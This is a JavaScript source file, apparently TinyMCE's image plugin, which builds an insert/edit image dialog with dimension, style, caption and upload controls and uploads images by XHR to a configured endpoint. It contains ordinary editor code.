(function () {
var image = (function (domGlobals) {
    'use strict';

    var global = tinymce.util.Tools.resolve('tinymce.PluginManager');

    var hasDimensions = function (editor) {
      return editor.settings.image_dimensions === false ? false : true;
    };
    var hasAdvTab = function (editor) {
      return editor.settings.image_advtab === true ? true : false;
    };
    var getPrependUrl = function (editor) {
      return editor.getParam('image_prepend_url', '');
    };
    var getClassList = function (editor) {
      return editor.getParam('image_class_list');
    };
    var hasDescription = function (editor) {
      return editor.settings.image_description === false ? false : true;
    };
    var hasImageTitle = function (editor) {
      return editor.settings.image_title === true ? true : false;
    };
    var hasImageCaption = function (editor) {
      return editor.settings.image_caption === true ? true : false;
    };
    var getImageList = function (editor) {
      return editor.getParam('image_list', false);
    };
    var hasUploadUrl = function (editor) {
      return editor.getParam('images_upload_url', false);
    };
    var hasUploadHandler = function (editor) {
      return editor.getParam('images_upload_handler', false);
    };
    var getUploadUrl = function (editor) {
      return editor.getParam('images_upload_url');
    };
    var getUploadHandler = function (editor) {
      return editor.getParam('images_upload_handler');
    };
    var getUploadBasePath = function (editor) {
      return editor.getParam('images_upload_base_path');
    };
    var getUploadCredentials = function (editor) {
      return editor.getParam('images_upload_credentials');
    };
    var Settings = {
      hasDimensions: hasDimensions,
      hasAdvTab: hasAdvTab,
      getPrependUrl: getPrependUrl,
      getClassList: getClassList,
      hasDescription: hasDescription,
      hasImageTitle: hasImageTitle,
      hasImageCaption: hasImageCaption,
      getImageList: getImageList,
      hasUploadUrl: hasUploadUrl,
      hasUploadHandler: hasUploadHandler,
      getUploadUrl: getUploadUrl,
      getUploadHandler: getUploadHandler,
      getUploadBasePath: getUploadBasePath,
      getUploadCredentials: getUploadCredentials
    };

    var Global = typeof domGlobals.window !== 'undefined' ? domGlobals.window : Function('return this;')();

    var path = function (parts, scope) {
      var o = scope !== undefined && scope !== null ? scope : Global;
      for (var i = 0; i < parts.length && o !== undefined && o !== null; ++i) {
        o = o[parts[i]];
      }
      return o;
    };
    var resolve = function (p, scope) {
      var parts = p.split('.');
      return path(parts, scope);
    };

    var unsafe = function (name, scope) {
      return resolve(name, scope);
    };
    var getOrDie = function (name, scope) {
      var actual = unsafe(name, scope);
      if (actual === undefined || actual === null) {
        throw new Error(name + ' not available on this browser');
      }
      return actual;
    };
    var Global$1 = { getOrDie: getOrDie };

    function FileReader () {
      var f = Global$1.getOrDie('FileReader');
      return new f();
    }

    var global$1 = tinymce.util.Tools.resolve('tinymce.util.Promise');

    var global$2 = tinymce.util.Tools.resolve('tinymce.util.Tools');

    var global$3 = tinymce.util.Tools.resolve('tinymce.util.XHR');

    var parseIntAndGetMax = function (val1, val2) {
      return Math.max(parseInt(val1, 10), parseInt(val2, 10));
    };
    var getImageSize = function (url, callback) {
      var img = domGlobals.document.createElement('img');
      function done(width, height) {
        if (img.parentNode) {
          img.parentNode.removeChild(img);
        }
        callback({
          width: width,
          height: height
        });
      }
      img.onload = function () {
        var width = parseIntAndGetMax(img.width, img.clientWidth);
        var height = parseIntAndGetMax(img.height, img.clientHeight);
        done(width, height);
      };
      img.onerror = function () {
        done(0, 0);
      };
      var style = img.style;
      style.visibility = 'hidden';
      style.position = 'fixed';
      style.bottom = style.left = '0px';
      style.width = style.height = 'auto';
      domGlobals.document.body.appendChild(img);
      img.src = url;
    };
    var buildListItems = function (inputList, itemCallback, startItems) {
      function appendItems(values, output) {
        output = output || [];
        global$2.each(values, function (item) {
          var menuItem = { text: item.text || item.title };
          if (item.menu) {
            menuItem.menu = appendItems(item.menu);
          } else {
            menuItem.value = item.value;
            itemCallback(menuItem);
          }
          output.push(menuItem);
        });
        return output;
      }
      return appendItems(inputList, startItems || []);
    };
    var removePixelSuffix = function (value) {
      if (value) {
        value = value.replace(/px$/, '');
      }
      return value;
    };
    var addPixelSuffix = function (value) {
      if (value.length > 0 && /^[0-9]+$/.test(value)) {
        value += 'px';
      }
      return value;
    };
    var mergeMargins = function (css) {
      if (css.margin) {
        var splitMargin = css.margin.split(' ');
        switch (splitMargin.length) {
        case 1:
          css['margin-top'] = css['margin-top'] || splitMargin[0];
          css['margin-right'] = css['margin-right'] || splitMargin[0];
          css['margin-bottom'] = css['margin-bottom'] || splitMargin[0];
          css['margin-left'] = css['margin-left'] || splitMargin[0];
          break;
        case 2:
          css['margin-top'] = css['margin-top'] || splitMargin[0];
          css['margin-right'] = css['margin-right'] || splitMargin[1];
          css['margin-bottom'] = css['margin-bottom'] || splitMargin[0];
          css['margin-left'] = css['margin-left'] || splitMargin[1];
          break;
        case 3:
          css['margin-top'] = css['margin-top'] || splitMargin[0];
          css['margin-right'] = css['margin-right'] || splitMargin[1];
          css['margin-bottom'] = css['margin-bottom'] || splitMargin[2];
          css['margin-left'] = css['margin-left'] || splitMargin[1];
          break;
        case 4:
          css['margin-top'] = css['margin-top'] || splitMargin[0];
          css['margin-right'] = css['margin-right'] || splitMargin[1];
          css['margin-bottom'] = css['margin-bottom'] || splitMargin[2];
          css['margin-left'] = css['margin-left'] || splitMargin[3];
        }
        delete css.margin;
      }
      return css;
    };
    var createImageList = function (editor, callback) {
      var imageList = Settings.getImageList(editor);
      if (typeof imageList === 'string') {
        global$3.send({
          url: imageList,
          success: function (text) {
            callback(JSON.parse(text));
          }
        });
      } else if (typeof imageList === 'function') {
        imageList(callback);
      } else {
        callback(imageList);
      }
    };
    var waitLoadImage = function (editor, data, imgElm) {
      function selectImage() {
        imgElm.onload = imgElm.onerror = null;
        if (editor.selection) {
          editor.selection.select(imgElm);
          editor.nodeChanged();
        }
      }
      imgElm.onload = function () {
        if (!data.width && !data.height && Settings.hasDimensions(editor)) {
          editor.dom.setAttribs(imgElm, {
            width: imgElm.clientWidth,
            height: imgElm.clientHeight
          });
        }
        selectImage();
      };
      imgElm.onerror = selectImage;
    };
    var blobToDataUri = function (blob) {
      return new global$1(function (resolve, reject) {
        var reader = FileReader();
        reader.onload = function () {
          resolve(reader.result);
        };
        reader.onerror = function () {
          reject(reader.error.message);
        };
        reader.readAsDataURL(blob);
      });
    };
    var Utils = {
      getImageSize: getImageSize,
      buildListItems: buildListItems,
      removePixelSuffix: removePixelSuffix,
      addPixelSuffix: addPixelSuffix,
      mergeMargins: mergeMargins,
      createImageList: createImageList,
      waitLoadImage: waitLoadImage,
      blobToDataUri: blobToDataUri
    };

    var global$4 = tinymce.util.Tools.resolve('tinymce.dom.DOMUtils');

    var hasOwnProperty = Object.prototype.hasOwnProperty;
    var shallow = function (old, nu) {
      return nu;
    };
    var baseMerge = function (merger) {
      return function () {
        var objects = new Array(arguments.length);
        for (var i = 0; i < objects.length; i++) {
          objects[i] = arguments[i];
        }
        if (objects.length === 0) {
          throw new Error('Can\'t merge zero objects');
        }
        var ret = {};
        for (var j = 0; j < objects.length; j++) {
          var curObject = objects[j];
          for (var key in curObject) {
            if (hasOwnProperty.call(curObject, key)) {
              ret[key] = merger(ret[key], curObject[key]);
            }
          }
        }
        return ret;
      };
    };
    var merge = baseMerge(shallow);

    var DOM = global$4.DOM;
    var getHspace = function (image) {
      if (image.style.marginLeft && image.style.marginRight && image.style.marginLeft === image.style.marginRight) {
        return Utils.removePixelSuffix(image.style.marginLeft);
      } else {
        return '';
      }
    };
    var getVspace = function (image) {
      if (image.style.marginTop && image.style.marginBottom && image.style.marginTop === image.style.marginBottom) {
        return Utils.removePixelSuffix(image.style.marginTop);
      } else {
        return '';
      }
    };
    var getBorder = function (image) {
      if (image.style.borderWidth) {
        return Utils.removePixelSuffix(image.style.borderWidth);
      } else {
        return '';
      }
    };
    var getAttrib = function (image, name) {
      if (image.hasAttribute(name)) {
        return image.getAttribute(name);
      } else {
        return '';
      }
    };
    var getStyle = function (image, name) {
      return image.style[name] ? image.style[name] : '';
    };
    var hasCaption = function (image) {
      return image.parentNode !== null && image.parentNode.nodeName === 'FIGURE';
    };
    var setAttrib = function (image, name, value) {
      image.setAttribute(name, value);
    };
    var wrapInFigure = function (image) {
      var figureElm = DOM.create('figure', { class: 'image' });
      DOM.insertAfter(figureElm, image);
      figureElm.appendChild(image);
      figureElm.appendChild(DOM.create('figcaption', { contentEditable: true }, 'Caption'));
      figureElm.contentEditable = 'false';
    };
    var removeFigure = function (image) {
      var figureElm = image.parentNode;
      DOM.insertAfter(image, figureElm);
      DOM.remove(figureElm);
    };
    var toggleCaption = function (image) {
      if (hasCaption(image)) {
        removeFigure(image);
      } else {
        wrapInFigure(image);
      }
    };
    var normalizeStyle = function (image, normalizeCss) {
      var attrValue = image.getAttribute('style');
      var value = normalizeCss(attrValue !== null ? attrValue : '');
      if (value.length > 0) {
        image.setAttribute('style', value);
        image.setAttribute('data-mce-style', value);
      } else {
        image.removeAttribute('style');
      }
    };
    var setSize = function (name, normalizeCss) {
      return function (image, name, value) {
        if (image.style[name]) {
          image.style[name] = Utils.addPixelSuffix(value);
          normalizeStyle(image, normalizeCss);
        } else {
          setAttrib(image, name, value);
        }
      };
    };
    var getSize = function (image, name) {
      if (image.style[name]) {
        return Utils.removePixelSuffix(image.style[name]);
      } else {
        return getAttrib(image, name);
      }
    };
    var setHspace = function (image, value) {
      var pxValue = Utils.addPixelSuffix(value);
      image.style.marginLeft = pxValue;
      image.style.marginRight = pxValue;
    };
    var setVspace = function (image, value) {
      var pxValue = Utils.addPixelSuffix(value);
      image.style.marginTop = pxValue;
      image.style.marginBottom = pxValue;
    };
    var setBorder = function (image, value) {
      var pxValue = Utils.addPixelSuffix(value);
      image.style.borderWidth = pxValue;
    };
    var setBorderStyle = function (image, value) {
      image.style.borderStyle = value;
    };
    var getBorderStyle = function (image) {
      return getStyle(image, 'borderStyle');
    };
    var isFigure = function (elm) {
      return elm.nodeName === 'FIGURE';
    };
    var defaultData = function () {
      return {
        src: '',
        alt: '',
        title: '',
        width: '',
        height: '',
        class: '',
        style: '',
        caption: false,
        hspace: '',
        vspace: '',
        border: '',
        borderStyle: ''
      };
    };
    var getStyleValue = function (normalizeCss, data) {
      var image = domGlobals.document.createElement('img');
      setAttrib(image, 'style', data.style);
      if (getHspace(image) || data.hspace !== '') {
        setHspace(image, data.hspace);
      }
      if (getVspace(image) || data.vspace !== '') {
        setVspace(image, data.vspace);
      }
      if (getBorder(image) || data.border !== '') {
        setBorder(image, data.border);
      }
      if (getBorderStyle(image) || data.borderStyle !== '') {
        setBorderStyle(image, data.borderStyle);
      }
      return normalizeCss(image.getAttribute('style'));
    };
    var create = function (normalizeCss, data) {
      var image = domGlobals.document.createElement('img');
      write(normalizeCss, merge(data, { caption: false }), image);
      setAttrib(image, 'alt', data.alt);
      if (data.caption) {
        var figure = DOM.create('figure', { class: 'image' });
        figure.appendChild(image);
        figure.appendChild(DOM.create('figcaption', { contentEditable: true }, 'Caption'));
        figure.contentEditable = 'false';
        return figure;
      } else {
        return image;
      }
    };
    var read = function (normalizeCss, image) {
      return {
        src: getAttrib(image, 'src'),
        alt: getAttrib(image, 'alt'),
        title: getAttrib(image, 'title'),
        width: getSize(image, 'width'),
        height: getSize(image, 'height'),
        class: getAttrib(image, 'class'),
        style: normalizeCss(getAttrib(image, 'style')),
        caption: hasCaption(image),
        hspace: getHspace(image),
        vspace: getVspace(image),
        border: getBorder(image),
        borderStyle: getStyle(image, 'borderStyle')
      };
    };
    var updateProp = function (image, oldData, newData, name, set) {
      if (newData[name] !== oldData[name]) {
        set(image, name, newData[name]);
      }
    };
    var normalized = function (set, normalizeCss) {
      return function (image, name, value) {
        set(image, value);
        normalizeStyle(image, normalizeCss);
      };
    };
    var write = function (normalizeCss, newData, image) {
      var oldData = read(normalizeCss, image);
      updateProp(image, oldData, newData, 'caption', function (image, _name, _value) {
        return toggleCaption(image);
      });
      updateProp(image, oldData, newData, 'src', setAttrib);
      updateProp(image, oldData, newData, 'alt', setAttrib);
      updateProp(image, oldData, newData, 'title', setAttrib);
      updateProp(image, oldData, newData, 'width', setSize('width', normalizeCss));
      updateProp(image, oldData, newData, 'height', setSize('height', normalizeCss));
      updateProp(image, oldData, newData, 'class', setAttrib);
      updateProp(image, oldData, newData, 'style', normalized(function (image, value) {
        return setAttrib(image, 'style', value);
      }, normalizeCss));
      updateProp(image, oldData, newData, 'hspace', normalized(setHspace, normalizeCss));
      updateProp(image, oldData, newData, 'vspace', normalized(setVspace, normalizeCss));
      updateProp(image, oldData, newData, 'border', normalized(setBorder, normalizeCss));
      updateProp(image, oldData, newData, 'borderStyle', normalized(setBorderStyle, normalizeCss));
    };

    var normalizeCss = function (editor, cssText) {
      var css = editor.dom.styles.parse(cssText);
      var mergedCss = Utils.mergeMargins(css);
      var compressed = editor.dom.styles.parse(editor.dom.styles.serialize(mergedCss));
      return editor.dom.styles.serialize(compressed);
    };
    var getSelectedImage = function (editor) {
      var imgElm = editor.selection.getNode();
      var figureElm = editor.dom.getParent(imgElm, 'figure.image');
      if (figureElm) {
        return editor.dom.select('img', figureElm)[0];
      }
      if (imgElm && (imgElm.nodeName !== 'IMG' || imgElm.getAttribute('data-mce-object') || imgElm.getAttribute('data-mce-placeholder'))) {
        return null;
      }
      return imgElm;
    };
    var splitTextBlock = function (editor, figure) {
      var dom = editor.dom;
      var textBlock = dom.getParent(figure.parentNode, function (node) {
        return editor.schema.getTextBlockElements()[node.nodeName];
      }, editor.getBody());
      if (textBlock) {
        return dom.split(textBlock, figure);
      } else {
        return figure;
      }
    };
    var readImageDataFromSelection = function (editor) {
      var image = getSelectedImage(editor);
      return image ? read(function (css) {
        return normalizeCss(editor, css);
      }, image) : defaultData();
    };
    var insertImageAtCaret = function (editor, data) {
      var elm = create(function (css) {
        return normalizeCss(editor, css);
      }, data);
      editor.dom.setAttrib(elm, 'data-mce-id', '__mcenew');
      editor.focus();
      editor.selection.setContent(elm.outerHTML);
      var insertedElm = editor.dom.select('*[data-mce-id="__mcenew"]')[0];
      editor.dom.setAttrib(insertedElm, 'data-mce-id', null);
      if (isFigure(insertedElm)) {
        var figure = splitTextBlock(editor, insertedElm);
        editor.selection.select(figure);
      } else {
        editor.selection.select(insertedElm);
      }
    };
    var syncSrcAttr = function (editor, image) {
      editor.dom.setAttrib(image, 'src', image.getAttribute('src'));
    };
    var deleteImage = function (editor, image) {
      if (image) {
        var elm = editor.dom.is(image.parentNode, 'figure.image') ? image.parentNode : image;
        editor.dom.remove(elm);
        editor.focus();
        editor.nodeChanged();
        if (editor.dom.isEmpty(editor.getBody())) {
          editor.setContent('');
          editor.selection.setCursorLocation();
        }
      }
    };
    var writeImageDataToSelection = function (editor, data) {
      var image = getSelectedImage(editor);
      write(function (css) {
        return normalizeCss(editor, css);
      }, data, image);
      syncSrcAttr(editor, image);
      if (isFigure(image.parentNode)) {
        var figure = image.parentNode;
        splitTextBlock(editor, figure);
        editor.selection.select(image.parentNode);
      } else {
        editor.selection.select(image);
        Utils.waitLoadImage(editor, data, image);
      }
    };
    var insertOrUpdateImage = function (editor, data) {
      var image = getSelectedImage(editor);
      if (image) {
        if (data.src) {
          writeImageDataToSelection(editor, data);
        } else {
          deleteImage(editor, image);
        }
      } else if (data.src) {
        insertImageAtCaret(editor, data);
      }
    };

    var updateVSpaceHSpaceBorder = function (editor) {
      return function (evt) {
        var dom = editor.dom;
        var rootControl = evt.control.rootControl;
        if (!Settings.hasAdvTab(editor)) {
          return;
        }
        var data = rootControl.toJSON();
        var css = dom.parseStyle(data.style);
        rootControl.find('#vspace').value('');
        rootControl.find('#hspace').value('');
        css = Utils.mergeMargins(css);
        if (css['margin-top'] && css['margin-bottom'] || css['margin-right'] && css['margin-left']) {
          if (css['margin-top'] === css['margin-bottom']) {
            rootControl.find('#vspace').value(Utils.removePixelSuffix(css['margin-top']));
          } else {
            rootControl.find('#vspace').value('');
          }
          if (css['margin-right'] === css['margin-left']) {
            rootControl.find('#hspace').value(Utils.removePixelSuffix(css['margin-right']));
          } else {
            rootControl.find('#hspace').value('');
          }
        }
        if (css['border-width']) {
          rootControl.find('#border').value(Utils.removePixelSuffix(css['border-width']));
        } else {
          rootControl.find('#border').value('');
        }
        if (css['border-style']) {
          rootControl.find('#borderStyle').value(css['border-style']);
        } else {
          rootControl.find('#borderStyle').value('');
        }
        rootControl.find('#style').value(dom.serializeStyle(dom.parseStyle(dom.serializeStyle(css))));
      };
    };
    var updateStyle = function (editor, win) {
      win.find('#style').each(function (ctrl) {
        var value = getStyleValue(function (css) {
          return normalizeCss(editor, css);
        }, merge(defaultData(), win.toJSON()));
        ctrl.value(value);
      });
    };
    var makeTab = function (editor) {
      return {
        title: 'Advanced',
        type: 'form',
        pack: 'start',
        items: [
          {
            label: 'Style',
            name: 'style',
            type: 'textbox',
            onchange: updateVSpaceHSpaceBorder(editor)
          },
          {
            type: 'form',
            layout: 'grid',
            packV: 'start',
            columns: 2,
            padding: 0,
            defaults: {
              type: 'textbox',
              maxWidth: 50,
              onchange: function (evt) {
                updateStyle(editor, evt.control.rootControl);
              }
            },
            items: [
              {
                label: 'Vertical space',
                name: 'vspace'
              },
              {
                label: 'Border width',
                name: 'border'
              },
              {
                label: 'Horizontal space',
                name: 'hspace'
              },
              {
                label: 'Border style',
                type: 'listbox',
                name: 'borderStyle',
                width: 90,
                maxWidth: 90,
                onselect: function (evt) {
                  updateStyle(editor, evt.control.rootControl);
                },
                values: [
                  {
                    text: 'Select...',
                    value: ''
                  },
                  {
                    text: 'Solid',
                    value: 'solid'
                  },
                  {
                    text: 'Dotted',
                    value: 'dotted'
                  },
                  {
                    text: 'Dashed',
                    value: 'dashed'
                  },
                  {
                    text: 'Double',
                    value: 'double'
                  },
                  {
                    text: 'Groove',
                    value: 'groove'
                  },
                  {
                    text: 'Ridge',
                    value: 'ridge'
                  },
                  {
                    text: 'Inset',
                    value: 'inset'
                  },
                  {
                    text: 'Outset',
                    value: 'outset'
                  },
                  {
                    text: 'None',
                    value: 'none'
                  },
                  {
                    text: 'Hidden',
                    value: 'hidden'
                  }
                ]
              }
            ]
          }
        ]
      };
    };
    var AdvTab = { makeTab: makeTab };

    var doSyncSize = function (widthCtrl, heightCtrl) {
      widthCtrl.state.set('oldVal', widthCtrl.value());
      heightCtrl.state.set('oldVal', heightCtrl.value());
    };
    var doSizeControls = function (win, f) {
      var widthCtrl = win.find('#width')[0];
      var heightCtrl = win.find('#height')[0];
      var constrained = win.find('#constrain')[0];
      if (widthCtrl && heightCtrl && constrained) {
        f(widthCtrl, heightCtrl, constrained.checked());
      }
    };
    var doUpdateSize = function (widthCtrl, heightCtrl, isContrained) {
      var oldWidth = widthCtrl.state.get('oldVal');
      var oldHeight = heightCtrl.state.get('oldVal');
      var newWidth = widthCtrl.value();
      var newHeight = heightCtrl.value();
      if (isContrained && oldWidth && oldHeight && newWidth && newHeight) {
        if (newWidth !== oldWidth) {
          newHeight = Math.round(newWidth / oldWidth * newHeight);
          if (!isNaN(newHeight)) {
            heightCtrl.value(newHeight);
          }
        } else {
          newWidth = Math.round(newHeight / oldHeight * newWidth);
          if (!isNaN(newWidth)) {
            widthCtrl.value(newWidth);
          }
        }
      }
      doSyncSize(widthCtrl, heightCtrl);
    };
    var syncSize = function (win) {
      doSizeControls(win, doSyncSize);
    };
    var updateSize = function (win) {
      doSizeControls(win, doUpdateSize);
    };
    var createUi = function () {
      var recalcSize = function (evt) {
        updateSize(evt.control.rootControl);
      };
      return {
        type: 'container',
        label: 'Dimensions',
        layout: 'flex',
        align: 'center',
        spacing: 5,
        items: [
          {
            name: 'width',
            type: 'textbox',
            maxLength: 5,
            size: 5,
            onchange: recalcSize,
            ariaLabel: 'Width'
          },
          {
            type: 'label',
            text: 'x'
          },
          {
            name: 'height',
            type: 'textbox',
            maxLength: 5,
            size: 5,
            onchange: recalcSize,
            ariaLabel: 'Height'
          },
          {
            name: 'constrain',
            type: 'checkbox',
            checked: true,
            text: 'Constrain proportions'
          }
        ]
      };
    };
    var SizeManager = {
      createUi: createUi,
      syncSize: syncSize,
      updateSize: updateSize
    };

    var onSrcChange = function (evt, editor) {
      var srcURL, prependURL, absoluteURLPattern;
      var meta = evt.meta || {};
      var control = evt.control;
      var rootControl = control.rootControl;
      var imageListCtrl = rootControl.find('#image-list')[0];
      if (imageListCtrl) {
        imageListCtrl.value(editor.convertURL(control.value(), 'src'));
      }
      global$2.each(meta, function (value, key) {
        rootControl.find('#' + key).value(value);
      });
      if (!meta.width && !meta.height) {
        srcURL = editor.convertURL(control.value(), 'src');
        prependURL = Settings.getPrependUrl(editor);
        absoluteURLPattern = new RegExp('^(?:[a-z]+:)?//', 'i');
        if (prependURL && !absoluteURLPattern.test(srcURL) && srcURL.substring(0, prependURL.length) !== prependURL) {
          srcURL = prependURL + srcURL;
        }
        control.value(srcURL);
        Utils.getImageSize(editor.documentBaseURI.toAbsolute(control.value()), function (data) {
          if (data.width && data.height && Settings.hasDimensions(editor)) {
            rootControl.find('#width').value(data.width);
            rootControl.find('#height').value(data.height);
            SizeManager.syncSize(rootControl);
          }
        });
      }
    };
    var onBeforeCall = function (evt) {
      evt.meta = evt.control.rootControl.toJSON();
    };
    var getGeneralItems = function (editor, imageListCtrl) {
      var generalFormItems = [
        {
          name: 'src',
          type: 'filepicker',
          filetype: 'image',
          label: 'Source',
          autofocus: true,
          onchange: function (evt) {
            onSrcChange(evt, editor);
          },
          onbeforecall: onBeforeCall
        },
        imageListCtrl
      ];
      if (Settings.hasDescription(editor)) {
        generalFormItems.push({
          name: 'alt',
          type: 'textbox',
          label: 'Image description'
        });
      }
      if (Settings.hasImageTitle(editor)) {
        generalFormItems.push({
          name: 'title',
          type: 'textbox',
          label: 'Image Title'
        });
      }
      if (Settings.hasDimensions(editor)) {
        generalFormItems.push(SizeManager.createUi());
      }
      if (Settings.getClassList(editor)) {
        generalFormItems.push({
          name: 'class',
          type: 'listbox',
          label: 'Class',
          values: Utils.buildListItems(Settings.getClassList(editor), function (item) {
            if (item.value) {
              item.textStyle = function () {
                return editor.formatter.getCssText({
                  inline: 'img',
                  classes: [item.value]
                });
              };
            }
          })
        });
      }
      if (Settings.hasImageCaption(editor)) {
        generalFormItems.push({
          name: 'caption',
          type: 'checkbox',
          label: 'Caption'
        });
      }
      return generalFormItems;
    };
    var makeTab$1 = function (editor, imageListCtrl) {
      return {
        title: 'General',
        type: 'form',
        items: getGeneralItems(editor, imageListCtrl)
      };
    };
    var MainTab = {
      makeTab: makeTab$1,
      getGeneralItems: getGeneralItems
    };

    var url = function () {
      return Global$1.getOrDie('URL');
    };
    var createObjectURL = function (blob) {
      return url().createObjectURL(blob);
    };
    var revokeObjectURL = function (u) {
      url().revokeObjectURL(u);
    };
    var URL = {
      createObjectURL: createObjectURL,
      revokeObjectURL: revokeObjectURL
    };

    var global$5 = tinymce.util.Tools.resolve('tinymce.ui.Factory');

    function XMLHttpRequest () {
      var f = Global$1.getOrDie('XMLHttpRequest');
      return new f();
    }

    var noop = function () {
    };
    var pathJoin = function (path1, path2) {
      if (path1) {
        return path1.replace(/\/$/, '') + '/' + path2.replace(/^\//, '');
      }
      return path2;
    };
    function Uploader (settings) {
      var defaultHandler = function (blobInfo, success, failure, progress) {
        var xhr, formData;
        xhr = XMLHttpRequest();
        xhr.open('POST', settings.url);
        xhr.withCredentials = settings.credentials;
        xhr.upload.onprogress = function (e) {
          progress(e.loaded / e.total * 100);
        };
        xhr.onerror = function () {
          failure('Image upload failed due to a XHR Transport error. Code: ' + xhr.status);
        };
        xhr.onload = function () {
          var json;
          if (xhr.status < 200 || xhr.status >= 300) {
            failure('HTTP Error: ' + xhr.status);
            return;
          }
          json = JSON.parse(xhr.responseText);
          if (!json || typeof json.location !== 'string') {
            failure('Invalid JSON: ' + xhr.responseText);
            return;
          }
          success(pathJoin(settings.basePath, json.location));
        };
        formData = new domGlobals.FormData();
        formData.append('file', blobInfo.blob(), blobInfo.filename());
        xhr.send(formData);
      };
      var uploadBlob = function (blobInfo, handler) {
        return new global$1(function (resolve, reject) {
          try {
            handler(blobInfo, resolve, reject, noop);
          } catch (ex) {
            reject(ex.message);
          }
        });
      };
      var isDefaultHandler = function (handler) {
        return handler === defaultHandler;
      };
      var upload = function (blobInfo) {
        return !settings.url && isDefaultHandler(settings.handler) ? global$1.reject('Upload url missing from the settings.') : uploadBlob(blobInfo, settings.handler);
      };
      settings = global$2.extend({
        credentials: false,
        handler: defaultHandler
      }, settings);
      return { upload: upload };
    }

    var onFileInput = function (editor) {
      return function (evt) {
        var Throbber = global$5.get('Throbber');
        var rootControl = evt.control.rootControl;
        var throbber = new Throbber(rootControl.getEl());
        var file = evt.control.value();
        var blobUri = URL.createObjectURL(file);
        var uploader = Uploader({
          url: Settings.getUploadUrl(editor),
          basePath: Settings.getUploadBasePath(editor),
          credentials: Settings.getUploadCredentials(editor),
          handler: Settings.getUploadHandler(editor)
        });
        var finalize = function () {
          throbber.hide();
          URL.revokeObjectURL(blobUri);
        };
        throbber.show();
        return Utils.blobToDataUri(file).then(function (dataUrl) {
          var blobInfo = editor.editorUpload.blobCache.create({
            blob: file,
            blobUri: blobUri,
            name: file.name ? file.name.replace(/\.[^\.]+$/, '') : null,
            base64: dataUrl.split(',')[1]
          });
          return uploader.upload(blobInfo).then(function (url) {
            var src = rootControl.find('#src');
            src.value(url);
            rootControl.find('tabpanel')[0].activateTab(0);
            src.fire('change');
            finalize();
            return url;
          });
        }).catch(function (err) {
          editor.windowManager.alert(err);
          finalize();
        });
      };
    };
    var acceptExts = '.jpg,.jpeg,.png,.gif';
    var makeTab$2 = function (editor) {
      return {
        title: 'Upload',
        type: 'form',
        layout: 'flex',
        direction: 'column',
        align: 'stretch',
        padding: '20 20 20 20',
        items: [
          {
            type: 'container',
            layout: 'flex',
            direction: 'column',
            align: 'center',
            spacing: 10,
            items: [
              {
                text: 'Browse for an image',
                type: 'browsebutton',
                accept: acceptExts,
                onchange: onFileInput(editor)
              },
              {
                text: 'OR',
                type: 'label'
              }
            ]
          },
          {
            text: 'Drop an image here',
            type: 'dropzone',
            accept: acceptExts,
            height: 100,
            onchange: onFileInput(editor)
          }
        ]
      };
    };
    var UploadTab = { makeTab: makeTab$2 };

    function curry(fn) {
      var initialArgs = [];
      for (var _i = 1; _i < arguments.length; _i++) {
        initialArgs[_i - 1] = arguments[_i];
      }
      return function () {
        var restArgs = [];
        for (var _i = 0; _i < arguments.length; _i++) {
          restArgs[_i] = arguments[_i];
        }
        var all = initialArgs.concat(restArgs);
        return fn.apply(null, all);
      };
    }

    var submitForm = function (editor, evt) {
      var win = evt.control.getRoot();
      SizeManager.updateSize(win);
      editor.undoManager.transact(function () {
        var data = merge(readImageDataFromSelection(editor), win.toJSON());
        insertOrUpdateImage(editor, data);
      });
      editor.editorUpload.uploadImagesAuto();
    };
    function Dialog (editor) {
      function showDialog(imageList) {
        var data = readImageDataFromSelection(editor);
        var win, imageListCtrl;
        if (imageList) {
          imageListCtrl = {
            type: 'listbox',
            label: 'Image list',
            name: 'image-list',
            values: Utils.buildListItems(imageList, function (item) {
              item.value = editor.convertURL(item.value || item.url, 'src');
            }, [{
                text: 'None',
                value: ''
              }]),
            value: data.src && editor.convertURL(data.src, 'src'),
            onselect: function (e) {
              var altCtrl = win.find('#alt');
              if (!altCtrl.value() || e.lastControl && altCtrl.value() === e.lastControl.text()) {
                altCtrl.value(e.control.text());
              }
              win.find('#src').value(e.control.value()).fire('change');
            },
            onPostRender: function () {
              imageListCtrl = this;
            }
          };
        }
        if (Settings.hasAdvTab(editor) || Settings.hasUploadUrl(editor) || Settings.hasUploadHandler(editor)) {
          var body = [MainTab.makeTab(editor, imageListCtrl)];
          if (Settings.hasAdvTab(editor)) {
            body.push(AdvTab.makeTab(editor));
          }
          if (Settings.hasUploadUrl(editor) || Settings.hasUploadHandler(editor)) {
            body.push(UploadTab.makeTab(editor));
          }
          win = editor.windowManager.open({
            title: 'Insert/edit image',
            data: data,
            bodyType: 'tabpanel',
            body: body,
            onSubmit: curry(submitForm, editor)
          });
        } else {
          win = editor.windowManager.open({
            title: 'Insert/edit image',
            data: data,
            body: MainTab.getGeneralItems(editor, imageListCtrl),
            onSubmit: curry(submitForm, editor)
          });
        }
        SizeManager.syncSize(win);
      }
      function open() {
        Utils.createImageList(editor, showDialog);
      }
      return { open: open };
    }

    var register = function (editor) {
      editor.addCommand('mceImage', Dialog(editor).open);
    };
    var Commands = { register: register };

    var hasImageClass = function (node) {
      var className = node.attr('class');
      return className && /\bimage\b/.test(className);
    };
    var toggleContentEditableState = function (state) {
      return function (nodes) {
        var i = nodes.length, node;
        var toggleContentEditable = function (node) {
          node.attr('contenteditable', state ? 'true' : null);
        };
        while (i--) {
          node = nodes[i];
          if (hasImageClass(node)) {
            node.attr('contenteditable', state ? 'false' : null);
            global$2.each(node.getAll('figcaption'), toggleContentEditable);
          }
        }
      };
    };
    var setup = function (editor) {
      editor.on('preInit', function () {
        editor.parser.addNodeFilter('figure', toggleContentEditableState(true));
        editor.serializer.addNodeFilter('figure', toggleContentEditableState(false));
      });
    };
    var FilterContent = { setup: setup };

    var register$1 = function (editor) {
      editor.addButton('image', {
        icon: 'image',
        tooltip: 'Insert/edit image',
        onclick: Dialog(editor).open,
        stateSelector: 'img:not([data-mce-object],[data-mce-placeholder]),figure.image'
      });
      editor.addMenuItem('image', {
        icon: 'image',
        text: 'Image',
        onclick: Dialog(editor).open,
        context: 'insert',
        prependToContext: true
      });
    };
    var Buttons = { register: register$1 };

    global.add('image', function (editor) {
      FilterContent.setup(editor);
      Buttons.register(editor);
      Commands.register(editor);
    });
    function Plugin () {
    }

    return Plugin;

}(window));
})();
